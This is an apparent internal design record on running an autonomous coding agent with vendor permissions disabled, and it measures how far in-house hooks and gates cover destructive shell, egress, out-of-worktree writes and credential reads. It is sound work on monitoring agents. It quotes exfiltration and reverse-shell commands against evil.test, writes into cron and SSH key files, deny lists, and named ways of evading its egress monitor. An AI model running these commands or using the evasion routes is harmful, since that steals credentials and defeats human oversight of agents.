# Agent Vendor Permission Bypass — `--dangerously-skip-permissions`

CUI // SP-CTI

**Task:** exa-bench-04 · **Control:** AC-3 / AC-6 / CM-7 · **ADR:** D394, D395
**Evidence:** `tests/test_skip_permissions_compensating_controls.py`

`tools/agents/adapters/claude_cli.py` invokes Claude Code with
`--dangerously-skip-permissions`. That adapter is `ADAPTER` for the `claude_cli`
executor, it is what the kanban runner dispatches through, and it is first in
the executor chain — so **every autonomous ICDEV build runs with the vendor
permission system disabled.**

Until now that was an incidental flag sitting in a list next to `--max-turns`
and `--output-format json`. This document makes it a stated decision, names what
is given up, names what compensates, and — the part that was missing — reports a
**measured** coverage matrix rather than an assertion that the ICDEV gates
"cover it."

---

## 1. The decision

**Keep the flag.** The adapter's whole purpose is non-interactive dispatch. The
vendor permission system's answer to an unattended prompt is to wait for a human
who is not there; `spawn()` hands the child a temp file on stdin and returns a
`Popen` for the kanban runner's poll/kill loop. A permission prompt in that path
does not make the build safer, it makes it hang until the runner's timeout kills
it — which is a liveness failure that reads as a safety control only until the
first time it fires.

**Consequence accepted:** the vendor prompt is not a control ICDEV has. Nor is
`.claude/settings.json`'s `permissions.deny` list — the permission system is what
evaluates that list, and the flag turns the permission system off. That list
(`rm -rf *`, `git push --force*`, `git reset --hard*`, `DROP TABLE*`, branch and
worktree deletes) is best read as a **precise inventory of what is given up**,
not as a second line of defence.

## 2. What actually observes a tool call — by path

This is the distinction that gets mis-stated most often, including in ICDEV's own
prose, so it is stated first and precisely.

| Execution path | What runs | Controls in the tool-call path |
|---|---|---|
| **In-process agent loop** — Studio `node_type: agent` steps, via `tools/studio/executors/agent_executor.py` | `icdev.tools.llm.agent_loop.run_agent_loop` inside the ICDEV process | `tools/studio/executors/agent_tool_gate.py` (AGENT-WF-001, default-deny, offer time **and** call time) chained to `tools/agent_runtime/approval_gate.py` (ars-appr-01 reversibility) |
| **Spawned vendor CLI** — `claude_cli` adapter, the kanban runner's path | a **separate** `claude` process, `Popen`'d | `.claude/hooks/pre_tool_use.py` only |

`agent_executor.py` is the sole module that calls both `build_gate_hook` and
`build_approval_hook`. `tools/agents/` imports neither — verifiable with
`grep -rn "approval_gate\|agent_tool_gate" tools/agents/`, whose only hits are the
two docstring lines in `claude_cli.py` that say so. The spawned CLI is a different
process that imports no ICDEV module at all.

> **rem-cap-03 (2026-08-16) measured the first row of this table and it is worse
> than "not in the adapter's path".** The in-process gate is also **disarmed by
> default**: `icdev/tools/llm/agent_loop.py::_resolve_approval_gate` reads
> `ICDEV_AGENT_APPROVAL_MODE` from the environment directly and returns *no gate*
> when it is unset — it never consults `approval_gate.resolve_mode()`, so
> `args/agent_runtime.yaml`'s shipped `command_mode: enforce` does not arm
> anything. Eleven of the twelve agent-loop call sites take that default; only
> `agent_executor.py` passes `approval_gate=` explicitly, and no `agent`-node step
> has ever run. Net: the reversibility gate has evaluated **zero** tool calls
> against its 62 declared rules, on a board that has dispatched 3,214 autonomous
> builds. See
> [`approval-gate-reachability.md`](approval-gate-reachability.md).

So: **the two gates usually named as the compensating controls for this flag are
not in this adapter's path.** They are real, they are default-deny, and they are
genuinely stronger than a vendor prompt — for the in-process loop. For the
spawned CLI the only ICDEV code that sees a tool call is the PreToolUse hook, and
until `exa-bench-05` `.claude/settings.json` wired that hook as:

```
python $CLAUDE_PROJECT_DIR/.claude/hooks/pre_tool_use.py || true
```

A PreToolUse hook signals "block" with **exit code 2**. `|| true` makes the shell
return 0 regardless. Every hard block that file advertised was therefore advisory
— in interactive sessions AND in the spawned CLI. (The headless path,
`tools/airgap/hook_compat.py::run_pre_tool_check`, never had the wrapper and did
block, so the unattended path was the stronger of the two.)

### 2a. What `exa-bench-05` changed

The wrapper is gone; the hook's exit 2 now reaches Claude Code, so this row of
the table above is a real control rather than a nominal one. Two conditions had
to be met first, and both are recorded rather than asserted:

**The checks were surveyed against real work.** `tools/hooks/fire_rate_survey.py`
replays the tool calls of recent sessions — **96,818 calls across 1,518 sessions**
in a 30-day window, read from the Claude Code transcripts, which are the only
corpus that carries the operands. `hook_events` cannot drive this: `post_tool_use.py`
persists tool-input KEY NAMES and never the value, so a replay sourced from it
reports zero fires for every check no matter what the sessions did —
indistinguishable from "safe to enable". Measured: 0 of 5,000 sampled rows carry
an operand, and the survey reports that rather than a zero.

Both columns below are the same corpus replayed through both versions of the
checks (`origin/main`'s and this branch's), so the delta is the narrowing and
not a change of corpus. The window rolls, so re-running moves the counts by a
few tenths of a percent; re-measure rather than quoting these.

| check | refusals /96,818 before | after | what was wrong |
|---|---:|---:|---|
| `write_outside_worktree` | 2,526 | 850 | four parse defects, no escapes — see below |
| `worktree_path` | 725 | 323 | unexpanded `"$P"` read as a violating path; parse spanned the whole compound command |
| `dangerous_rm` | 553 | 36 | `\brm` matched `docker run --rm`; `.*` spanned `;` so a later `grep -r` completed an earlier `rm -f`; every target counted as "dangerous", so the rule was "no `rm -rf`, ever" |
| `git_danger` | 390 | 186 | matched the raw command text, so a commit message or PR body describing `git reset --hard` refused, and a `python -c "…'git push --force'…"` probe refused; `(?:[^\n]*\s)?` spanned `&&`, so a later `git worktree remove --force` completed an earlier `git push`; `\.` matched the leading dot of a dotfile, so the path-scoped `git checkout -- .cursor/mcp-setup.md` read as `git checkout -- .` |
| `direct_sqlite_usage` | 289 | 47 | matched documentation and the check's own source; refused read-only diagnostics |
| `file_access_tiers` | 99 | 72 | `!.env.example` exclusions matched full paths only while inclusions also matched the basename; and it shares the redirect scan rewritten below |
| `env_file_access` | 85 | 39 | `\b\.env\b` matched `process.env`, `\.env` in a grep pattern, and PR-body prose |
| `append_only_write` | 36 | 22 | matched `grep "DELETE FROM audit_trail"` and commit messages |
| `network_egress` | 76 | 76 | unchanged — and this is its *enforcing* rate; it ships monitor-only, so its refusal rate today is 0 |
| `branch_deletion` | 37 | 37 | unchanged — already fails open unless the branch holds unmerged commits |
| `agent_rules` | 0 | 0 | unchanged — monitor-only unless a rule is placed in `args/agent_rules_enforce/` |
| `review_loop_precommit` | 1,485 | 1,485 | unchanged — cannot refuse unless `ICDEV_REVIEW_LOOP_BLOCK=1` |

Across the checks that can refuse, that is **4,703 → 1,575 of 96,818** calls,
4.86% → 1.63%.

**`write_outside_worktree` had to be surveyed even though it was already
enforcing.** exa-bench-07 shipped it as a hard block *while the wrapper was still
discarding every refusal*, so nothing it returned had ever reached anyone and its
rate had never been observed. Removing the wrapper is what arms it, which makes
it this task's to measure. At 2,526 — 2.61%, three times the next check — it
would have refused one call in forty on its first day. Every class of that was a
parse defect and none was an escape:

| fires | cause | fix |
|---:|---|---|
| 758 | a heredoc **body** scanned as commands: `cat > .tmp/prbody.md <<'EOF'` and a PR body naming `tools/hooks/shared_checks.py` read as a write to `C:\tools\hooks` | scan per `command_segments()`, which strips heredoc data already |
| 641 | `$( … 2>/dev/null)` — the closing paren stayed on the token, so `/dev/null)` missed the null-sink list | `(`/`)` terminate a word outside quotes |
| 539 | Git Bash spells this worktree `/c/AI/ICDev/…`, which resolved to `C:\c\AI\ICDev\…`: sessions writing **inside their own worktree** | translate the MSYS drive prefix on Windows |
| 371 | `~/.claude/plans` — plan mode writes the plan file and no session names it | sanction the harness's own state dirs, **not** `~/.claude` itself, which holds `settings.json` and `hooks/` |
| 370 | a `>` inside a quoted string taken for a redirection operator: `--jq '"#\(.n) -> \(.state)"'` returned `\(.state)"'` as a path | recognise operators with a quote-aware scan, not a regex |
| 38 | `\` read as an escape inside double quotes, eating the separators out of `> "C:\Users\…\r.json"` | escape only `" \ $ \`` there, as a shell does |

That leaves **850 (0.878%)**, of which 261 are not reproducible offline at all —
the worktree the call was made from no longer exists, so the replay cannot
anchor the verdict and counts it as a fire, which makes this an upper bound. The
589 that remain are writes into `C:\AI\.worktrees\…` and `C:\AI\.wt*\…`: the
historic worktree sprawl that `check_worktree_path` already refuses to *create*
and that `tools.git.worktree_paths.is_sanctioned` deliberately does not bless.
Those are the finding, so the check stays enforcing — the alternative on the
table was standing it down to monitor-only, which is how the hook came to be
advisory in the first place. Each row above is pinned by a test in
`tests/hooks/test_shared_checks.py`, and `WRITE_BOUNDARY_DEFAULT_MODE ==
"enforce"` is pinned by its own.

`git_danger` is new to this table because it is new to this surface:
exa-bench-06 wired it into `main()`, where `|| true` then discarded its verdict.
Turning the hook on is what makes its fire rate matter, so it was surveyed like
the rest. One of its narrowings is a **policy** call rather than a parser fix and
is called out here rather than buried: **`git push --force-with-lease` is no
longer refused.** It was 127 of the 390 — the single largest category — and it is
what sessions run to update their own `kanban/*` branch. It also refuses the push
outright when the remote moved underneath it, which is exactly the concurrent-session
collision this repo is built around. Bare `--force` / `-f` stays refused (4 in the
corpus, all genuine). Note this diverges from the `git push --force*` glob in
`permissions.deny` in the same file, which matches `--force-with-lease` as a
prefix; that list is not reconciled here because it governs a different surface —
the vendor prompt that this adapter turns off.

The residue is not zero and is not claimed to be. What remains matches each
check's stated rule: `cat .env`, `rm -rf ~`, a raw `sqlite3.connect` write to
`data/icdev.db`, `git reset --hard` and `git branch -D` (both of which
`permissions.deny` in this same file already forbids — the hook is now enforcing
a declared policy on the path where the vendor list never ran), and a
`git worktree add` into a root `tools.git.worktree_paths` does not sanction.
That last is the largest single residue at 323, and every sampled one is the
`%TEMP%\claude\wt-*` layout CLAUDE.md explicitly documents as the collision
source. Those refusals are the point of turning the hook on.

**Turning it off is nameable.** `ICDEV_PRETOOLUSE_ENFORCE=0` restores advisory
behaviour for all eleven checks — every one still runs and prints, prefixed
`ADVISORY:` — and each check has its own switch (`CHECK_KILL_SWITCHES` in the
hook, one entry per `HOOK_CHECKS` entry). An environment variable is auditable in
a way a shell operator buried in a JSON string is not.

**Still open, and it turns out to be a bigger finding than "one more `|| true`."**
`icdev/data/claude_bootstrap/claude/settings.json.template`, the copy a
scaffolded project inherits, keeps its wrapper. Not for symmetry — because
without it a scaffolded project would error on **every tool call**.

`BOOTSTRAP_MAP` in `tools/cli/init.py` ships `data/claude_bootstrap/claude/hooks`
to `.claude/hooks`, and ships no `tools/` at all. The hook's first act is to load
`<project>/tools/hooks/shared_checks.py` by path — deliberately not wrapped in
`try`, because "a guard that cannot load must fail loudly, not silently stop
guarding". In a scaffolded project that file does not exist. Measured 2026-08-12
against the packaged hook in a synthetic `icdev init` layout:

```
scaffolded project has tools/hooks/shared_checks.py: False
exit: 1
FileNotFoundError: ...\myproj\tools\hooks\shared_checks.py
```

So `icdev init` currently ships a PreToolUse hook that cannot run at all, and
`|| true` is the only reason nobody has noticed — it converts a hard failure on
every tool call into silence. Removing the wrapper without fixing the packaging
would trade an invisible dead guard for a visibly broken project.

`exa-bench-05-b` is therefore the packaging fix first (ship `tools/hooks/`, or
vendor the checks into the packaged hook), and only then the wrapper. The
enforcement machinery is already in the packaged hook, refreshed here by
`python tools/installer/prebuild_bootstrap.py`, so the template flips in one
line once the import resolves.

## 3. Compensating controls, and why they are defensible where they apply

For the in-process loop the ICDEV stack is arguably stronger than the prompt it
replaces, for three reasons that a per-call yes/no prompt does not give you:

1. **Default-deny by name, twice.** `agent_workflow_tools` in
   `args/security_gates.yaml` has `default: deny`. `authorize_toolset` filters at
   offer time so an unauthorized tool is never described to the model, and
   `build_gate_hook` re-checks at call time because "not offered" is a weaker
   claim than "not authorized."
2. **Default-deny by tier.** `args/agent_approval_policy.yaml` sets
   `default_tier: unknown` with `unknown` in `require_approval_tiers`. A tool has
   to be *named* to be automatic. Content patterns may always **escalate** and may
   only **downgrade** for a declared generic executor.
3. **Append-only evidence.** Every decision, allowed and refused, lands in
   `agent_approval_log` / `studio_mcp_dispatch_audit` with actor and reason.
   Argument values are never stored — key names and a SHA-256 only.

A vendor prompt has none of the three: it is per-call, it is not recorded, and it
fails open the moment a human clicks through.

## 4. Measured coverage of the four categories

### What "covered" has to mean

A vendor prompt interposes a human decision **on every call, with the arguments
in front of the approver**. So the bar is *per-call* mediation — and the two
ICDEV layers do not both clear it:

- **`agent_tool_gate` (AGENT-WF-001)** decides by tool **name**, and — since
  `exa-bench-09` — by **path** for an argument naming credential material. A
  refusal is per call: the tool is never callable. But `requires_approval` parks
  **one gate per `(run, tool)`** — `approval_step_id("write_file")` is
  `approval:agent:write_file` whatever the path, and `await_approval`'s own
  docstring says "an agent that writes ten files asks once."
- **`approval_gate` (ars-appr-01)** decides by name **and flattened content**, on
  every call. This is the layer that can tell `rm -rf /` from `ls`. For a path it
  told nothing apart at all until `exa-bench-09` added a **confidentiality**
  dimension, consulted independently of the reversibility tier.

Four mediation strengths result, and only the first two clear the bar:

| Strength | Meaning |
|---|---|
| `refused` | not allowlisted — never offered, never callable |
| `per_call_approval` | content-aware halt on **every** call |
| `per_run_approval_only` | one path-blind human gate for the whole run |
| `unmediated` | no decision at any layer |

### The matrix

Every verdict below is measured, not asserted, and is pinned probe-by-probe in
`tests/test_skip_permissions_compensating_controls.py`.

| Category | Verdict | Strength | What decides it |
|---|---|---|---|
| **Destructive shell** | **COVERED** | `per_call_approval` | Explicit `irreversible` patterns (`rm -rf`, `git reset --hard`, `git clean -dfx`, `DROP TABLE`, `mkfs`, `dd if=`) halt every call; anything else on `run_command` falls to `default_tier: unknown` and halts anyway. |
| **Network egress** | **COVERED — in-process by the default, on the spawned CLI by a real egress rule** | `per_call_approval` / `refused` | *In-process, unchanged:* the `curl`/`wget` pattern only matches `-X POST\|PUT\|DELETE\|PATCH`, `--data`, `-d `. A GET exfil (`curl https://x/?d=secret`) matches **no** pattern — it halts because it lands in `unknown`. `http_post` and `upload_file` are not allowlisted at all, so they are refused outright. *On the spawned CLI (exa-bench-08):* `shared_checks.check_network_egress` models the **destination** and runs in both hook paths. See §4a. |
| **Writes outside the worktree** | **COVERED — at the hook, not at the gates** | `hard block` | The gates say what they always said: `write_file` / `patch_file` are gated by **name**, once per run, then auto-allowed at tier `recoverable` with the path never examined; `run_command` with `touch` or `mkdir` matches the `recoverable` **downgrade** pattern for any path. What changed is a layer below them — `shared_checks.check_write_outside_worktree` (exa-bench-07) refuses a write whose **resolved** target is outside the session worktree, on both guard paths, and `build_approval_hook` consults that hard block *before* it classifies anything. |
| **Credential access** | **NOT COVERED** | `unmediated` | `read_file` is in the AGENT-WF-001 `allowed` list — no gate at all — and is tier `reversible`, where `classify()` rule 0 exempts it from content escalation entirely. **No argument can ever escalate a read**: `read_file('~/.ssh/id_rsa')` classifies identically to `read_file('README.md')`. |

Two things this matrix says that the shorter version got wrong, and which are
worth stating because they are the difference between a real finding and a
scary-sounding one:

- Writes are **not** ungated at the gate layer — they are gated *by name, once
  per run*. That is a meaningfully weaker guarantee than a vendor prompt, not
  the absence of one. `edit_file` and `apply_patch` are in fact refused outright,
  but only because nobody allowlisted those spellings — an accident of naming,
  not a path policy, and it would evaporate the moment someone adds them.
- Egress is covered **in-process** by the fail-closed default, not by an egress
  rule. That protection is real and it is also incidental, and it is still
  incidental — `exa-bench-08` did not change `approval_gate`. What it changed is
  the consequence: there is now an independent second layer on the surface that
  had none, so a `curl` downgrade in `args/agent_approval_policy.yaml` degrades
  one layer instead of removing the control. See §4a.

### Why the remaining gap is structural, not an oversight

Both gaps fell out of a rationale that is correct in its own frame and silently
loses its premise at a boundary. One has been closed; the shape is worth keeping
side by side because the closure of the first is the argument for the second.

- `write_file` is `recoverable` **because git restores it**. Git only restores
  paths *inside the repo*. The tier is right for `tools/foo.py` and wrong for
  `~/.ssh/authorized_keys`, and nothing in the classifier can tell them apart
  because it never looks at the path. The AGENT-WF-001 gate above it is
  name-scoped for the same reason it can be one-gate-per-run at all: a tool
  name is a constant, a path is an argument. **Closed by exa-bench-07** — see
  the Closed table below. Note *where*: the classifier is still path-blind, and
  `TestGapMechanisms` pins that. The boundary was added a layer lower, where
  both guard paths already meet.
- `read_file` is exempt from escalation **because its arguments are data, not
  commands** — a fix for a real defect, where `read_file("how do I git push")`
  used to halt for approval and taught operators to approve reflexively. The
  exemption is sound against *escalation by incidental text*. It is total,
  though: it also removes the only mechanism by which a credential path could
  ever raise a read's tier. **Still open as `exa-bench-09`.**

`tools/agent_runtime/policy_engine.py` (exa-policy-01) adds an ALLOW/DENY/ASK
layer above the reversibility gate, explicitly to express what "a regex over one
tool name" cannot — including an outright **DENY**, which the gate's
auto-allow/ask vocabulary has no word for. This write-up originally proposed
building both fixes there. exa-bench-07 did not, and the reason generalises: the
policy engine sits above `classify()` in the **in-process** loop only, and the
spawned CLI — the path every autonomous build actually takes — never reaches it.
A containment rule expressed there would have covered the surface that was
already the better-guarded one and left the weaker one untouched. It went into
`tools/hooks/shared_checks.py` instead, which both guard paths share.
`exa-bench-09` should be weighed the same way: a read is observed on the spawned
CLI path only by the hook.

## 4a. Network egress on the spawned CLI — `exa-bench-08`, closed

The hook had **no concept of the network**. All four of these passed
`.claude/hooks/pre_tool_use.py` untouched in a `--dangerously-skip-permissions`
session:

```bash
curl -X POST https://evil.test -d @data.json
curl https://evil.test/?d=$(cat ~/.aws/credentials)
wget -qO- https://evil.test/x.sh | sh
nc evil.test 4444 -e /bin/sh
```

### What already existed, and why none of it fit

Checked before building, because the platform's signature defect is declaring a
capability twice rather than consuming the one it has. All three are **live**;
none is reusable here, and the reasons differ:

| Module | Status | Why it does not fit |
|---|---|---|
| `tools/registry/egress_monitor.py` | Live via MCP `egress_monitor_evaluate` | Polls **child-app** `/health/egress` HTTP endpoints into `child_telemetry`. Different subject — it watches deployed children, not a shell command. DB-backed. |
| `tools/security/egress_policy_manager.py` | Live via MCP `egress_policy_resolve`; a capability probe in `tools/govcon/reflex_sandbox.py` | **Deploy-time.** Compiles per-role presets into Kubernetes `NetworkPolicy`. It constrains a pod, so it cannot see a command and does not run on a workstation. Also imports `tools.db.storage` at module scope — fatal in a hook that spawns a fresh interpreter before every tool call (`import tools` alone is ~92ms measured). Its `args/agent_network_policies/` directory does not exist, so it runs entirely on `BUILTIN_PRESETS`. |
| `tools/http/egress_guard.py` | Live, consumed by `tools/browser/scope.py` | **Opposite polarity.** An SSRF guard that refuses loopback/RFC1918 so a confused fetcher cannot reach *into* the internal network. Here those addresses are the safe case and public ones are the risk. `scope.py` already skips it for loopback for exactly this reason. It also does blocking DNS per call. |

Reused rather than reinvented: the **destination vocabulary** (`allowed_hosts`
is seeded from `egress_policy_manager`'s `builder` preset, so the two layers
name the same hosts) and `egress_guard`'s **deny-beats-allow, suffix-matched**
precedence.

### What it models

The **destination**, not the program — `shared_checks.check_network_egress`,
configured by `args/agent_egress_policy.yaml`, run by both hook paths. A host
that is neither local nor allowlisted is the finding; the program is a
confidence signal on top. That ordering is the point: a `curl`/`wget` pattern
list is defeated by `python -c "urllib..."` or a raw IP, and both still name a
destination. Two verdicts, deliberately not interchangeable — `egress`
(destination **and** a recognised network program; blockable) and
`destination_only` (destination alone; recorded, never blocked, because an
unrecognised program is precisely the case the check cannot decide).

### Measured fire rate — monitor-only until this was known

Shipped `enforce: false`. Measured over **78,903 real `Bash` calls** from 2,346
local Claude Code transcripts, with
`python tools/security/egress_fire_rate.py --corpus --json`:

| Verdict | Count | Share |
|---|---:|---:|
| clean | 77,417 | 98.12% |
| allowlisted | 1,413 | 1.79% |
| `destination_only` | 0 | 0.00% |
| **`egress`** (would block) | **73** | **0.093%** |

The first pass measured **1.83%**, and the difference is the whole reason to
measure. 1,371 of those 1,440 firings — 95% — were `claude.com`, because this
repo mandates a `https://claude.com/claude-code` attribution footer on every PR
body, so every `gh pr create` carried one. Unallowlisted, that alone would have
made the guard noise and got it switched off. Two further false positives were
extraction bugs the corpus exposed and unit tests would not have: an f-string
interpolation read as the host `{os.environ[chr`, and `from tools.db.storage
import ...` read as a hostname because an ssh-family word appeared elsewhere in
the same command. Both are fixed and pinned.

The residual 0.093% is dominated by **example hostnames inside test fixtures and
documentation** (`example.com`, `evil.test`, `exfil.example`) — the check
correctly seeing exfil-shaped strings in test data — plus a handful of genuine
CDN fetches (`cdn.jsdelivr.net`, `unpkg.com`, `cdnjs.cloudflare.com`) and
`ollama.com`. Re-run the measurement before flipping `enforce: true`.

### Evasion boundary — stated, not implied

A guard whose limits are only claimed in prose gets trusted past them. A shell
command is not statically decidable, and every one of these passes: shell
indirection (`curl "$URL"`, `curl $(cat u.txt)`); encoding (base64, string
concatenation, punycode); a destination that lives in a **second file**
(`python exfil.py`); an **allowlisted carrier** — `github.com` is allowlisted,
so a gist push or a branch of secrets is egress this permits by construction;
non-IP transports (DNS tunnelling, ICMP, an inbound-connected listener); and
anything assembled across two tool calls.

These blind spots are pinned as *passing* tests in
`tests/hooks/test_network_egress.py::TestTheEvasionBoundaryIsReal`, so the
claim is falsifiable rather than decorative. This is a **tripwire with named
blind spots, not a network boundary**. The boundary is
`egress_policy_manager`'s `NetworkPolicy`, at the pod.

## 5. Follow-up tasks — filed, not quietly accepted

All five of the original follow-ups were already on the board when this write-up
landed — they cite "ADR D394" because they were filed expecting the decision to
be written up, which is what exa-bench-04 does. Three have since closed and are
below. `exa-bench-05-b` is the one gap this document discovered rather than
inherited: it surfaced while closing `exa-bench-05`, and is filed rather than
fixed in passing.

| Task | Gap | Category |
|---|---|---|
| `exa-bench-05-b` | `icdev init` ships `.claude/hooks/pre_tool_use.py` but no `tools/hooks/shared_checks.py` (`BOOTSTRAP_MAP`, `tools/cli/init.py`), so the packaged hook raises `FileNotFoundError` and exits 1 on **every** tool call — measured. `\|\| true` in `settings.json.template` is the only thing hiding it. Fix the packaging first, then the wrapper. | (generated projects) |
| `exa-bench-07-b` | The write-boundary residue: 589 measured refusals are writes into `C:\AI\.worktrees` and `C:\AI\.wt*`, the pre-`worktree_paths` sprawl. Those are correct refusals under current policy, but they are also a migration nobody has done — the sessions that wrote there had nowhere sanctioned to write. | (worktree hygiene) |

### Closed

| Task | Gap | Closed by |
|---|---|---|
| `exa-bench-05` | `\|\| true` in `.claude/settings.json` made every `pre_tool_use.py` hard block advisory: a PreToolUse hook signals "block" with exit code 2 and the wrapper returned 0 whatever the hook decided. The headless path had no wrapper and did block, so the unattended path was the **stronger** of the two — backwards, since the Claude Code path is the one spawned with the vendor permission system off. | The wrapper removed, after a per-check fire-rate survey over 96,818 real tool calls narrowed eight checks that were refusing legitimate work — 4.86% of all calls down to 1.63% (`tools/hooks/fire_rate_survey.py`). The largest was `write_outside_worktree`, already enforcing since exa-bench-07 but never observed because the wrapper discarded what it returned: 2,526 → 850, four parse defects and no escapes. Enforcement stands down with `ICDEV_PRETOOLUSE_ENFORCE=0` — every check still runs and prints, prefixed `ADVISORY:` — and each check keeps its own `ICDEV_*_GUARD` switch. See §2a. Pinned by `TestSpawnedCliHookMediation`, which runs the configured command through a shell and asserts the 2 reaches the caller. |
| `exa-bench-09` | Credential-path reads were unclassifiable: rule 0 exempted `read_file` from all content escalation, `read_file` was allowlisted at AGENT-WF-001 with no gate, and the `file_access_tiers` glob list — hand-maintained, and the only one of the three surfaces with any path concept at all — covered `**/credentials.json` but not `~/.aws/credentials`, `~/.netrc`, `~/.kube/config`, `~/.docker/config.json` or `~/.config/gh/hosts.yml`. | `args/sensitive_paths.yaml` + `tools/security/sensitive_paths.py`: ONE inventory, consumed by `file_access_tiers` (which now `inherits: sensitive_paths` instead of restating globs), by `approval_gate` and by `agent_tool_gate`, so a path added once is gained by all three in the same commit. Carve-outs for committed templates are applied to every entry. Pinned by `tests/test_sensitive_paths.py`. |
| `exa-bench-08` | The hook had **no egress concept at all**, and in-process coverage rested on `default_tier: unknown` rather than on an egress rule — allowlisting one HTTP tool, or adding a `curl` downgrade pattern, removed it silently. Measured: `curl -X POST https://evil.test -d @data.json`, a `$(cat ~/.aws/credentials)` GET, `wget -qO- ... \| sh` and `nc evil.test 4444 -e /bin/sh` all passed the hook untouched. | `shared_checks.check_network_egress` + `args/agent_egress_policy.yaml`, wired into **both** hook paths. Models the DESTINATION, not the program, so `python -c "urllib..."` and raw IPs are caught too. Shipped **monitor-only**; measured fire rate 0.093% over 78,903 real Bash calls before enforcement is offered. Evasion boundary stated in the docstring and pinned as passing tests. See §4a. |
| `exa-bench-06` | The Claude Code hook ran 9 of the 10 shared checks — `check_git_danger` was in `shared_checks` and in `HEADLESS_CHECKS` but was never called from `main()`. Measured: `git reset --hard origin/main` and `git clean -fdx` were **refused headlessly and allowed** in a Claude Code session. Separately, `_REDIRECT_TARGET_RE` (`>\s*([^\s\|;&]+)`) mis-captured `>>`: the first `>` matched, `\s*` matched nothing, and the capture took the **second** `>`, so `file_path` became the literal `">"`, matched no tier, and `echo k >> ~/.ssh/authorized_keys` was allowed while the single-`>` form of the same command was blocked. | `check_git_danger` wired into `main()` at the same position `HEADLESS_CHECKS` runs it; `_REDIRECT_TARGET_RE` rewritten as `(?<!>)>{1,2}\s*(?!&)([^\s\|;&>]+)` plus a `tee` pattern, and the tier check now examines **every** target a command names rather than the first. (exa-bench-05 has since replaced that regex outright with `shell_words_and_operators`, a quote-aware walk — the regex could not tell a redirection operator from a `>` inside a string, which was 370 false refusals. Both properties this row asserts are preserved and still pinned.) Pinned by `tests/hooks/test_hook_parity.py` (the two paths run the same check set, and each declared check is provably reached from `main()`) and the redirect cases in `tests/hooks/test_shared_checks.py`. |
| `exa-bench-07` | No worktree containment on **any** surface. `write_file` to `/etc/cron.d/pwn`, `~/.bashrc` or `../../sibling-repo/setup.py` was allowed by `.claude/hooks/pre_tool_use.py` and auto-allowed by `approval_gate`. The AGENT-WF-001 gate is one per `(run, tool)` and path-blind; `approval_gate` holds `write_file` / `patch_file` at `recoverable` for any path; the `touch` / `mkdir` downgrade patterns auto-allow a `run_command` write to any absolute path. D-ORCH-8's `args/file_access_tiers.yaml` could not cover it: a glob list enumerates paths, and the point of a boundary is the paths nobody enumerated. | `shared_checks.check_write_outside_worktree` — one implementation, wired into `HOOK_CHECKS` **and** `HEADLESS_CHECKS`, refusing a write whose **resolved** target (`..` and symlinks followed first) is outside the session worktree, the main checkout it is linked to, and the scratch roots `tools/git/worktree_paths` sanctions. Anchored on the containing **worktree** — `AgentSession.working_dir` is a worktree, not the repo root. Bash targets are read from `touch` / `mkdir` / `cp` / `dd of=` / `curl -o` as well as redirects, since those write with no operator to match. `approval_gate._hard_block` was also dropping a write tool's path on the way to the hook, so `patch_file` arrived pathless. Fails OPEN on a resolution error; `ICDEV_WRITE_BOUNDARY_GUARD=0` disables, `=monitor` records without refusing. Pinned by `TestWriteBoundaryIsEnforcedOnBothPaths`. |

`exa-bench-06` (both halves) and `exa-bench-07` were **coverage** bugs of the
same shape as the open gaps above: a control that exists, is registered, and
is never reached — or, for `exa-bench-07`, one that was never written because
a glob list looked like it was already the answer. `exa-bench-08` is the
adjacent shape: a control that did not exist at all on the surface that needed
it. `exa-bench-05` is the third and the one the others depended on: a control
that existed, ran, and reached the right verdict, which the shell then
discarded.

They compose, and only together. 06 made the two paths run the same checks;
07 added the boundary a glob list cannot express; 05 made the Claude Code
path's verdict binding. Until 05 landed, "the unattended path and the Claude
Code path refuse the same commands" was true of what the checks *returned* and
false of what actually happened — every refusal 06, 07 and 08 added was
discarded by `|| true` on the one surface that runs with the vendor permission
system off.

## 6. How this stays true

`tests/test_skip_permissions_compensating_controls.py` fails on **both**
directions of drift:

- a **regression** — a covered category stops halting;
- an **unrecorded fix** — an uncovered category starts halting while this
  document still lists it as a gap.

The second is the unusual one and it is deliberate. A gap that gets closed
without the write-up being updated leaves the next reader with a document that
overstates the risk, which is the same failure mode as one that understates it.
`TestSpawnedCliEgressSurface::test_the_write_up_records_the_closure` is that
rule applied to §4a: closing the egress gap without editing this file fails CI.
Run the test when touching `tools/agents/adapters/claude_cli.py`,
`.claude/hooks/pre_tool_use.py`, `tools/hooks/shared_checks.py`,
`args/agent_approval_policy.yaml`, `args/sensitive_paths.yaml`,
`args/file_access_tiers.yaml`, `args/agent_egress_policy.yaml`, or
`agent_workflow_tools` in `args/security_gates.yaml`.

```bash
pytest tests/test_skip_permissions_compensating_controls.py -v
pytest tests/hooks/test_network_egress.py -v                  # the §4a egress check
python tools/security/egress_fire_rate.py --json              # what the hook has recorded
python tools/security/egress_fire_rate.py --corpus --json     # re-measure before enforcing
```
